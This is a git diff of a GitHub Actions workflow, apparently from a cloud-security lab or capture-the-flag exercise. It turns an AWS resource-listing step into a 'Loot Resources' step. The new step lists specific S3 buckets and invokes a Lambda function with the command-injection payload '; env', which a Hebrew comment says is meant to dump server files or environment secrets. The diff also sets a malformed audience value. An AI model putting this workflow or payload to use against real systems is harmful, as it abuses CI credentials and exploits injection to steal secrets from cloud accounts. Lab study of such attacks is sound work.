@@ -16,9 +16,16 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
-          audience: sts.amazonaws.com
+          audience: ://amazonaws.com
 
-      - name: List Resources
+      - name: Loot Resources
         run: |
-          aws s3 ls || true
-          aws lambda list-functions --region us-east-1 || true
+          echo "=== Scanning S3 Buckets ==="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
+          aws s3 ls s3://codec4f26c862a321ef5/ || true
+          aws s3 ls s3://site781fe43f26b9eba3/ || true
+          
+          echo "=== Testing Lambda Exploitation ==="
+          # שליחת אירוע המנצל את ה-Command Injection כדי להדפיס את קובצי השרת או ה-env
+          aws lambda invoke --function-name nslookupv2 --payload '{"domain": "; env"}' response.json || true
+          cat response.json || true
